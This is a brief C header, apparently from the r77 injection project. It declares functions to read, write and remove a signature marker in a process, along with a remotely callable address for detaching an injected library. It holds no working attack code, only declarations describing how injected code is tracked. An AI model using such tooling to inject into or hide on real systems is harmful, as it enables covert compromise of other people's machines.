#include "r77mindef.h"
#ifndef _R77HEADER_H
#define _R77HEADER_H

/// <summary>
/// Retrieves the r77 header from the current process.
/// </summary>
/// <param name="detachAddress">If applicable, a pointer to a function pointer to write the detach address to.</param>
/// <returns>
/// The signature (R77_SIGNATURE, R77_SERVICE_SIGNATURE, or R77_HELPER_SIGNATURE) from the current process, or 0, if the current process does not have an r77 header.
/// </returns>
WORD GetR77Header(LPVOID *detachAddress);
/// <summary>
/// Writes the r77 header to the current process.
/// </summary>
/// <param name="signature">The signature to be written. This is either R77_SIGNATURE, R77_SERVICE_SIGNATURE or R77_HELPER_SIGNATURE.</param>
/// <param name="detachAddress">If applicable, a function pointer that can be invoked remotely to gracefully detach the injected library.</param>
/// <returns>
/// TRUE, if the header was written;
/// otherwise, FALSE.
/// </returns>
BOOL WriteR77Header(WORD signature, LPVOID detachAddress);
/// <summary>
/// Removes the r77 header from the current process.
/// </summary>
VOID RemoveR77Header();

#endif